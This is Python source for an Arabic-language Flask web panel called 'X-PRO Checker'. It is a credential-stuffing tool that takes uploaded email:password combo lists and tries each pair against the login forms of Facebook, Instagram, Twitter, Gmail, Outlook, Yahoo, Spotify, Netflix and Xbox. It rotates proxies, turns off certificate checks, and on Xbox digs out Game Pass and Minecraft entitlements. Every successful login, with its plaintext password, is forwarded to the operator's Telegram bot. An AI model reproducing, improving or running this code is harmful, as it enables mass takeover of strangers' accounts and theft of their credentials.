from flask import Flask, request, jsonify, send_file, session, render_template_string
import requests
import json
import os
import threading
import time
import re
import random
import urllib3
from datetime import datetime
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# =================== إعدادات ===================
urllib3.disable_warnings()

# =================== إنشاء المجلدات ===================
os.makedirs("downloads", exist_ok=True)
os.makedirs("results", exist_ok=True)
os.makedirs("proxies", exist_ok=True)

# =================== الإحصائيات العامة ===================
CURRENT_SCAN = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "bad": 0,
    "errors": 0,
    "progress": 0,
    "status": "idle"
}

# =================== كلاس فحص المنصات ===================
class PlatformChecker:
    
    @staticmethod
    def check_facebook(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://www.facebook.com/", timeout=20)
            lsd = re.search(r'name="lsd" value="([^"]+)"', resp.text)
            jazoest = re.search(r'name="jazoest" value="([^"]+)"', resp.text)
            if not lsd or not jazoest:
                return {"status": "error", "platform": "Facebook", "email": email}
            login_data = {
                "lsd": lsd.group(1),
                "jazoest": jazoest.group(1),
                "email": email,
                "pass": password,
                "login": "Log In"
            }
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://www.facebook.com/login/", data=login_data, headers=headers, allow_redirects=True, timeout=20)
            if "home.php" in login_resp.url or "facebook.com/?sk=welcome" in login_resp.url:
                name_match = re.search(r'"name":"([^"]+)"', login_resp.text)
                name = name_match.group(1) if name_match else "N/A"
                return {"status": "hit", "platform": "Facebook", "email": email, "password": password, "name": name, "extra": f"Name: {name}"}
            if "checkpoint" in login_resp.url:
                return {"status": "2fa", "platform": "Facebook", "email": email}
            return {"status": "bad", "platform": "Facebook", "email": email}
        except:
            return {"status": "error", "platform": "Facebook", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_instagram(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://www.instagram.com/", timeout=20)
            csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text)
            if not csrf:
                return {"status": "error", "platform": "Instagram", "email": email}
            headers = {
                "User-Agent": "Mozilla/5.0",
                "X-CSRFToken": csrf.group(1),
                "Content-Type": "application/x-www-form-urlencoded"
            }
            login_data = {
                "username": email,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": "{}"
            }
            login_resp = session.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", data=login_data, headers=headers, timeout=20)
            if login_resp.status_code == 200:
                data = login_resp.json()
                if data.get("authenticated"):
                    return {"status": "hit", "platform": "Instagram", "email": email, "password": password, "user_id": data.get("userId", "N/A"), "extra": f"User ID: {data.get('userId', 'N/A')}"}
                if data.get("two_factor_required"):
                    return {"status": "2fa", "platform": "Instagram", "email": email}
            return {"status": "bad", "platform": "Instagram", "email": email}
        except:
            return {"status": "error", "platform": "Instagram", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_twitter(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://twitter.com/", timeout=20)
            token = re.search(r'name="authenticity_token" value="([^"]+)"', resp.text)
            if not token:
                return {"status": "error", "platform": "Twitter", "email": email}
            login_data = {
                "authenticity_token": token.group(1),
                "session[username_or_email]": email,
                "session[password]": password,
                "remember_me": "1"
            }
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://twitter.com/sessions", data=login_data, headers=headers, allow_redirects=True, timeout=20)
            if "/home" in login_resp.url:
                return {"status": "hit", "platform": "Twitter", "email": email, "password": password, "extra": "Login Successful"}
            return {"status": "bad", "platform": "Twitter", "email": email}
        except:
            return {"status": "error", "platform": "Twitter", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_gmail(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://accounts.google.com/ServiceLogin?service=mail", timeout=20)
            galx = re.search(r'name="GALX" value="([^"]+)"', resp.text)
            if not galx:
                return {"status": "error", "platform": "Gmail", "email": email}
            login_data = {"Email": email, "Passwd": password, "GALX": galx.group(1), "service": "mail"}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://accounts.google.com/ServiceLoginAuth", data=login_data, headers=headers, allow_redirects=True, timeout=20)
            if "mail.google.com" in login_resp.url:
                return {"status": "hit", "platform": "Gmail", "email": email, "password": password, "extra": "Access Granted"}
            if "signin/challenge" in login_resp.url:
                return {"status": "2fa", "platform": "Gmail", "email": email}
            return {"status": "bad", "platform": "Gmail", "email": email}
        except:
            return {"status": "error", "platform": "Gmail", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_outlook(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://login.live.com/", timeout=20)
            sftag = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
            if not sftag:
                return {"status": "error", "platform": "Outlook", "email": email}
            login_data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": sftag.group(1),
                "type": "11"
            }
            login_resp = session.post("https://login.live.com/", data=login_data, allow_redirects=True, timeout=20)
            if "outlook.live.com" in login_resp.url or "mail.live.com" in login_resp.url:
                return {"status": "hit", "platform": "Outlook", "email": email, "password": password, "extra": "Access Granted"}
            if "incorrect" in login_resp.text.lower() or "doesn't exist" in login_resp.text.lower():
                return {"status": "bad", "platform": "Outlook", "email": email}
            if "security challenge" in login_resp.text.lower() or "two-step" in login_resp.text.lower():
                return {"status": "2fa", "platform": "Outlook", "email": email}
            return {"status": "bad", "platform": "Outlook", "email": email}
        except:
            return {"status": "error", "platform": "Outlook", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_yahoo(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://login.yahoo.com/", timeout=20)
            crumb = re.search(r'"crumb":"([^"]+)"', resp.text)
            if not crumb:
                return {"status": "error", "platform": "Yahoo", "email": email}
            login_data = {"username": email, "password": password, "crumb": crumb.group(1)}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            login_resp = session.post("https://login.yahoo.com/account/challenge/password", json=login_data, headers=headers, timeout=20)
            if login_resp.status_code == 200:
                data = login_resp.json()
                if data.get("success"):
                    return {"status": "hit", "platform": "Yahoo", "email": email, "password": password, "extra": "Login Successful"}
                return {"status": "bad", "platform": "Yahoo", "email": email}
            return {"status": "bad", "platform": "Yahoo", "email": email}
        except:
            return {"status": "error", "platform": "Yahoo", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_spotify(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://accounts.spotify.com/", timeout=20)
            csrf = re.search(r'name="csrf_token" value="([^"]+)"', resp.text)
            if not csrf:
                return {"status": "error", "platform": "Spotify", "email": email}
            login_data = {"email": email, "password": password, "csrf_token": csrf.group(1), "remember": "1"}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://accounts.spotify.com/login/", data=login_data, headers=headers, allow_redirects=True, timeout=20)
            if "spotify.com/account" in login_resp.url or "spotify.com/home" in login_resp.url:
                return {"status": "hit", "platform": "Spotify", "email": email, "password": password, "extra": "Premium Checked"}
            return {"status": "bad", "platform": "Spotify", "email": email}
        except:
            return {"status": "error", "platform": "Spotify", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_netflix(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://www.netflix.com/login", timeout=20)
            auth_url = re.search(r'"authURL":"([^"]+)"', resp.text)
            if not auth_url:
                return {"status": "error", "platform": "Netflix", "email": email}
            login_data = {"email": email, "password": password, "rememberMe": "true"}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            login_resp = session.post(auth_url.group(1), json=login_data, headers=headers, timeout=20)
            if login_resp.status_code == 200:
                data = login_resp.json()
                if data.get("success"):
                    return {"status": "hit", "platform": "Netflix", "email": email, "password": password, "extra": "Account Active"}
                return {"status": "bad", "platform": "Netflix", "email": email}
            return {"status": "bad", "platform": "Netflix", "email": email}
        except:
            return {"status": "error", "platform": "Netflix", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_xbox(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=20)
            sftag = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
            if not sftag:
                return {"status": "error", "platform": "Xbox", "email": email}
            
            login_data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": sftag.group(1),
                "type": "11"
            }
            login_resp = session.post("https://login.live.com/", data=login_data, allow_redirects=True, timeout=20)
            
            ms_token = None
            if 'access_token' in login_resp.url:
                ms_token = re.search(r'access_token=([^&\s"\']+)', login_resp.url)
                if ms_token:
                    ms_token = ms_token.group(1)
            
            if not ms_token:
                if "incorrect" in login_resp.text.lower():
                    return {"status": "bad", "platform": "Xbox", "email": email}
                if "security" in login_resp.text.lower() or "two-step" in login_resp.text.lower():
                    return {"status": "2fa", "platform": "Xbox", "email": email}
                return {"status": "bad", "platform": "Xbox", "email": email}
            
            xb_payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers={'Content-Type': 'application/json'}, timeout=20)
            
            if xb_req.status_code != 200:
                return {"status": "error", "platform": "Xbox", "email": email}
            
            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
            
            gamertag = "N/A"
            gamerscore = "0"
            try:
                xsts_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, headers={'Content-Type': 'application/json'}, timeout=20)
                if xsts_req.status_code == 200:
                    xsts_token = xsts_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                                          headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, timeout=20)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': gamerscore = s['value']
            except:
                pass
            
            has_gp = False
            has_mc = False
            gp_type = ""
            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers={'Content-Type': 'application/json'}, timeout=20)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                          json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"},
                                          headers={'Content-Type': 'application/json'}, timeout=20)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                                headers={'Authorization': f'Bearer {mc_token}'}, timeout=20)
                            if ent_req.status_code == 200:
                                ent_text = ent_req.text
                                if 'product_game_pass_ultimate' in ent_text:
                                    gp_type = "Game Pass Ultimate"
                                    has_gp = True
                                elif 'product_game_pass_pc' in ent_text:
                                    gp_type = "PC Game Pass"
                                    has_gp = True
                                elif 'product_game_pass_console' in ent_text:
                                    gp_type = "Xbox Game Pass Console"
                                    has_gp = True
                                has_mc = 'product_minecraft' in ent_text
            except:
                pass
            
            platform_type = "Xbox"
            if has_gp:
                platform_type = "GamePass"
            elif has_mc:
                platform_type = "Minecraft"
            
            extra = f"Gamertag: {gamertag} | Score: {gamerscore}"
            if has_gp:
                extra += f" | {gp_type}"
            if has_mc:
                extra += " | Has Minecraft"
            
            return {
                "status": "hit",
                "platform": platform_type,
                "email": email,
                "password": password,
                "gamertag": gamertag,
                "gamerscore": gamerscore,
                "gamepass": gp_type if has_gp else "No",
                "minecraft": "Yes" if has_mc else "No",
                "extra": extra
            }
        except:
            return {"status": "error", "platform": "Xbox", "email": email}
        finally:
            session.close()

# =================== واجهة الموقع ===================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X-PRO Checker - لوحة التحكم</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Tahoma', Arial, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: #1a1a1a;
            border-radius: 15px;
            padding: 30px;
            border: 1px solid #333;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
        }
        .header {
            text-align: center;
            padding-bottom: 25px;
            border-bottom: 2px solid #00ff88;
            margin-bottom: 25px;
        }
        .header h1 {
            font-size: 32px;
            color: #00ff88;
            text-shadow: 0 0 20px rgba(0,255,136,0.3);
        }
        .header p { color: #888; font-size: 14px; margin-top: 5px; }
        .section {
            background: #222;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        .section h3 {
            color: #00ff88;
            margin-bottom: 15px;
            font-size: 18px;
            border-right: 3px solid #00ff88;
            padding-right: 10px;
        }
        .form-group { margin-bottom: 15px; }
        .form-group label {
            display: block;
            color: #aaa;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            background: #1a1a1a;
            border: 1px solid #444;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            transition: all 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 15px rgba(0,255,136,0.1);
        }
        .form-group input::placeholder { color: #555; }
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-block;
            margin: 5px;
        }
        .btn-primary { background: #00ff88; color: #000; }
        .btn-primary:hover { background: #00cc6a; transform: scale(1.02); box-shadow: 0 0 25px rgba(0,255,136,0.3); }
        .btn-danger { background: #ff4444; color: #fff; }
        .btn-danger:hover { background: #cc3333; }
        .btn-info { background: #0099ff; color: #fff; }
        .btn-info:hover { background: #0077cc; }
        .btn-success { background: #44bb44; color: #fff; }
        .btn-success:hover { background: #339933; }
        .btn-warning { background: #ffaa00; color: #000; }
        .btn-warning:hover { background: #cc8800; }
        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-right: 10px;
        }
        .status-online { background: #00ff88; color: #000; }
        .status-offline { background: #ff4444; color: #fff; }
        .status-pending { background: #ffaa00; color: #000; }
        .status-error { background: #ff4444; color: #fff; }
        .progress-bar {
            width: 100%;
            height: 25px;
            background: #333;
            border-radius: 12px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00cc6a);
            transition: width 0.5s;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            color: #000;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
            margin: 10px 0;
        }
        .stat-box {
            background: #1a1a1a;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid #333;
        }
        .stat-box .number {
            font-size: 24px;
            font-weight: bold;
            color: #00ff88;
        }
        .stat-box .label { font-size: 11px; color: #888; margin-top: 3px; }
        .message {
            padding: 12px 15px;
            border-radius: 8px;
            margin: 10px 0;
            display: none;
        }
        .message-success {
            background: rgba(0,255,136,0.1);
            border: 1px solid #00ff88;
            color: #00ff88;
            display: block;
        }
        .message-error {
            background: rgba(255,68,68,0.1);
            border: 1px solid #ff4444;
            color: #ff4444;
            display: block;
        }
        .message-info {
            background: rgba(0,153,255,0.1);
            border: 1px solid #0099ff;
            color: #0099ff;
            display: block;
        }
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        .flex-row { display: flex; align-items: center; flex-wrap: wrap; gap: 10px; }
        .info-text {
            color: #888;
            font-size: 13px;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 8px;
            border-right: 3px solid #00ff88;
            margin-bottom: 15px;
        }
        @media (max-width: 600px) {
            .container { padding: 15px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 X-PRO CHECKER</h1>
            <p>لوحة التحكم - إدارة البوت والفحص</p>
        </div>

        <!-- قسم إعدادات البوت -->
        <div class="section">
            <h3>🤖 إعدادات البوت</h3>
            <div class="info-text">
                📌 أدخل توكن البوت والأيدي الخاص بك، ثم اضغط "اختبار الاتصال" لتأكيد عمل البوت.
                <br>بعد التأكيد، يمكنك إرسال ملف <strong>combo.txt</strong> للبوت في التليجرام وسيتم رفعه للفحص تلقائياً.
            </div>
            <div class="form-group">
                <label>📌 توكن البوت (Bot Token)</label>
                <input type="text" id="bot_token" placeholder="أدخل توكن البوت هنا..." value="">
            </div>
            <div class="form-group">
                <label>🆔 أيدي المشرف (Chat ID)</label>
                <input type="text" id="bot_chat_id" placeholder="أدخل أيدي المستخدم هنا..." value="">
            </div>
            <div class="flex-row">
                <button class="btn btn-primary" onclick="testConnection()">🔍 اختبار الاتصال</button>
                <span id="status_badge" class="status-badge status-offline">🔴 غير متصل</span>
            </div>
            <div id="config_message" class="message"></div>
        </div>

        <!-- قسم إحصائيات الفحص -->
        <div class="section">
            <h3>📊 إحصائيات الفحص</h3>
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="number" id="stat_total">0</div>
                    <div class="label">📝 الإجمالي</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="stat_checked">0</div>
                    <div class="label">✅ تم الفحص</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="stat_hits" style="color: #00ff88;">0</div>
                    <div class="label">🎯 الضربات</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="stat_bad" style="color: #ff4444;">0</div>
                    <div class="label">❌ الفاشلة</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="stat_errors" style="color: #ffaa00;">0</div>
                    <div class="label">⚠️ الأخطاء</div>
                </div>
            </div>
            <div style="display: flex; justify-content: space-between; color: #888; font-size: 13px; margin-top: 10px;">
                <span>الحالة: <strong id="scan_state">⏹ متوقف</strong></span>
                <span>التقدم: <strong id="scan_progress">0%</strong></span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress_fill" style="width: 0%;">0%</div>
            </div>
        </div>

        <!-- قسم تحميل النتائج -->
        <div class="section">
            <h3>📤 تحميل النتائج</h3>
            <div class="btn-group">
                <button class="btn btn-success" onclick="downloadResults()">📥 تحميل النتائج</button>
                <button class="btn btn-danger" onclick="clearResults()">🗑️ مسح النتائج</button>
                <button class="btn btn-info" onclick="refreshStats()">🔄 تحديث</button>
            </div>
            <div id="result_message" class="message"></div>
        </div>
    </div>

    <script>
        // ========== اختبار الاتصال ==========
        function testConnection() {
            const token = document.getElementById('bot_token').value.trim();
            const chatId = document.getElementById('bot_chat_id').value.trim();
            
            if (!token || !chatId) {
                showMessage('config_message', '❌ يرجى إدخال التوكن والأيدي', 'error');
                return;
            }
            
            showMessage('config_message', '⏳ جاري اختبار الاتصال...', 'info');
            
            fetch('/test_connection', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'bot_token=' + encodeURIComponent(token) + '&bot_chat_id=' + encodeURIComponent(chatId)
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showMessage('config_message', '✅ ' + data.message, 'success');
                    updateStatus('online');
                } else {
                    showMessage('config_message', '❌ ' + data.message, 'error');
                    updateStatus('error');
                }
            })
            .catch(() => {
                showMessage('config_message', '❌ خطأ في الاتصال بالخادم', 'error');
                updateStatus('offline');
            });
        }

        // ========== تحديث الحالة ==========
        function updateStatus(status) {
            const badge = document.getElementById('status_badge');
            const map = {
                'online': { text: '🟢 متصل', class: 'status-online' },
                'offline': { text: '🔴 غير متصل', class: 'status-offline' },
                'error': { text: '❌ خطأ', class: 'status-error' },
                'pending': { text: '⏳ جاري', class: 'status-pending' }
            };
            const s = map[status] || map['offline'];
            badge.textContent = s.text;
            badge.className = 'status-badge ' + s.class;
        }

        // ========== عرض الرسائل ==========
        function showMessage(elementId, text, type) {
            const el = document.getElementById(elementId);
            el.textContent = text;
            el.className = 'message message-' + type;
            el.style.display = 'block';
            setTimeout(() => { el.style.display = 'none'; }, 8000);
        }

        // ========== تحديث الإحصائيات ==========
        function updateStats(data) {
            document.getElementById('stat_total').textContent = data.total || 0;
            document.getElementById('stat_checked').textContent = data.checked || 0;
            document.getElementById('stat_hits').textContent = data.hits || 0;
            document.getElementById('stat_bad').textContent = data.bad || 0;
            document.getElementById('stat_errors').textContent = data.errors || 0;
            document.getElementById('scan_progress').textContent = (data.progress || 0) + '%';
            document.getElementById('progress_fill').style.width = (data.progress || 0) + '%';
            document.getElementById('progress_fill').textContent = (data.progress || 0) + '%';
            
            const statusMap = {
                'running': '🔄 يعمل',
                'completed': '✅ مكتمل',
                'idle': '⏹ متوقف'
            };
            document.getElementById('scan_state').textContent = statusMap[data.status] || data.status;
        }

        // ========== تحديث تلقائي ==========
        function refreshStats() {
            fetch('/stats')
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    updateStats(data.scan_data);
                    updateStatus(data.bot_status);
                }
            })
            .catch(() => {});
        }

        // ========== تحميل النتائج ==========
        function downloadResults() {
            showMessage('result_message', '⏳ جاري تحميل النتائج...', 'info');
            fetch('/get_results')
            .then(res => {
                if (res.ok) return res.blob();
                return res.json().then(data => { throw new Error(data.message || 'خطأ'); });
            })
            .then(blob => {
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'results.txt';
                document.body.appendChild(a);
                a.click();
                a.remove();
                window.URL.revokeObjectURL(url);
                showMessage('result_message', '✅ تم تحميل النتائج بنجاح', 'success');
            })
            .catch(err => showMessage('result_message', '❌ ' + err.message, 'error'));
        }

        // ========== مسح النتائج ==========
        function clearResults() {
            if (!confirm('⚠️ هل أنت متأكد من مسح جميع النتائج؟')) return;
            fetch('/clear_results', { method: 'POST' })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showMessage('result_message', '✅ ' + data.message, 'success');
                    refreshStats();
                } else {
                    showMessage('result_message', '❌ ' + data.message, 'error');
                }
            })
            .catch(() => showMessage('result_message', '❌ خطأ في مسح النتائج', 'error'));
        }

        // ========== تحديث تلقائي كل 5 ثواني ==========
        setInterval(refreshStats, 5000);
        refreshStats();
    </script>
</body>
</html>
'''

# =================== دوال الموقع ===================
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/test_connection', methods=['POST'])
def test_connection():
    token = request.form.get('bot_token', '').strip()
    chat_id = request.form.get('bot_chat_id', '').strip()
    
    if not token or not chat_id:
        return jsonify({"success": False, "message": "❌ يرجى إدخال التوكن والأيدي"})
    
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": "✅ *تم الاتصال بنجاح!*\n\n🔥 البوت جاهز لاستقبال الملفات\n📁 أرسل ملف `combo.txt` لبدء الفحص\n\n👑 المطور: HackerExos",
            "parse_mode": "Markdown"
        }
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            session['bot_token'] = token
            session['bot_chat_id'] = chat_id
            session['bot_status'] = 'online'
            
            return jsonify({
                "success": True,
                "message": "✅ تم الاتصال بنجاح! تم إرسال رسالة تأكيد للبوت",
                "status": "online"
            })
        else:
            session['bot_status'] = 'error'
            return jsonify({
                "success": False,
                "message": f"❌ فشل الاتصال: {response.text[:100]}",
                "status": "error"
            })
            
    except Exception as e:
        session['bot_status'] = 'offline'
        return jsonify({
            "success": False,
            "message": f"❌ خطأ في الاتصال: {str(e)}",
            "status": "offline"
        })

@app.route('/upload_combo', methods=['POST'])
def upload_combo():
    global CURRENT_SCAN
    
    bot_token = session.get('bot_token')
    bot_chat_id = session.get('bot_chat_id')
    
    if not bot_token or not bot_chat_id:
        return jsonify({"success": False, "message": "❌ يرجى إدخال توكن البوت والأيدي في الموقع أولاً"})
    
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "لم يتم رفع ملف"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "message": "اسم الملف فارغ"})
    
    if not file.filename.endswith('.txt'):
        return jsonify({"success": False, "message": "يرجى رفع ملف .txt فقط"})
    
    file_path = f"downloads/combo_{int(time.time())}.txt"
    file.save(file_path)
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]
    
    if not combos:
        return jsonify({"success": False, "message": "الملف فارغ أو غير صالح"})
    
    CURRENT_SCAN["total"] = len(combos)
    CURRENT_SCAN["checked"] = 0
    CURRENT_SCAN["hits"] = 0
    CURRENT_SCAN["bad"] = 0
    CURRENT_SCAN["errors"] = 0
    CURRENT_SCAN["progress"] = 0
    CURRENT_SCAN["status"] = "running"
    
    threading.Thread(target=run_scan, args=(combos, file_path, bot_token, bot_chat_id), daemon=True).start()
    
    return jsonify({
        "success": True,
        "message": f"✅ بدء الفحص على {len(combos)} حساب",
        "total": len(combos)
    })

def send_telegram_message(bot_token, chat_id, text, parse_mode='Markdown'):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
        requests.post(url, data=data, timeout=5)
    except:
        pass

def send_telegram_file(bot_token, chat_id, file_path, caption=''):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=10)
    except:
        pass

def run_scan(combos, file_path, bot_token, bot_chat_id):
    global CURRENT_SCAN
    
    all_hits = []
    total_checks = 0
    
    send_telegram_message(bot_token, bot_chat_id, f"🚀 *بدأ الفحص*\n📊 عدد الحسابات: {len(combos)}")
    
    proxies = []
    if os.path.exists("proxies/proxy.txt"):
        with open("proxies/proxy.txt", "r", encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
    
    checkers = [
        ("Facebook", PlatformChecker.check_facebook),
        ("Instagram", PlatformChecker.check_instagram),
        ("Twitter", PlatformChecker.check_twitter),
        ("Gmail", PlatformChecker.check_gmail),
        ("Outlook", PlatformChecker.check_outlook),
        ("Yahoo", PlatformChecker.check_yahoo),
        ("Spotify", PlatformChecker.check_spotify),
        ("Netflix", PlatformChecker.check_netflix),
        ("Xbox", PlatformChecker.check_xbox)
    ]
    
    for combo in combos:
        try:
            email, password = combo.split(':', 1)
            email = email.strip()
            password = password.strip()
            
            proxy = random.choice(proxies) if proxies else None
            
            for platform_name, check_func in checkers:
                result = check_func(email, password, proxy)
                total_checks += 1
                
                if result["status"] == "hit":
                    CURRENT_SCAN["hits"] += 1
                    all_hits.append(result)
                    
                    hit_msg = f"🎯 *ضربة جديدة!*\n"
                    hit_msg += f"📌 المنصة: {result['platform']}\n"
                    hit_msg += f"📧 الإيميل: `{result['email']}`\n"
                    hit_msg += f"🔑 كلمة المرور: `{result['password']}`\n"
                    if result.get("extra"):
                        hit_msg += f"📝 معلومات: {result['extra']}\n"
                    if result.get("gamertag"):
                        hit_msg += f"🎮 Gamertag: {result['gamertag']}\n"
                    if result.get("gamepass") and result["gamepass"] != "No":
                        hit_msg += f"🎁 Game Pass: {result['gamepass']}\n"
                    if result.get("minecraft") and result["minecraft"] == "Yes":
                        hit_msg += f"⛏️ Minecraft: ✅\n"
                    
                    send_telegram_message(bot_token, bot_chat_id, hit_msg)
                    
                elif result["status"] == "bad":
                    CURRENT_SCAN["bad"] += 1
                elif result["status"] == "error":
                    CURRENT_SCAN["errors"] += 1
                
                CURRENT_SCAN["checked"] = total_checks
                CURRENT_SCAN["progress"] = int((total_checks / (len(combos) * len(checkers))) * 100)
                
                if total_checks % 20 == 0:
                    send_telegram_message(bot_token, bot_chat_id,
                        f"📊 *تقدم الفحص*\n✅ {total_checks} فحص\n🎯 {CURRENT_SCAN['hits']} ضربة")
                
        except Exception as e:
            CURRENT_SCAN["errors"] += 1
            continue
    
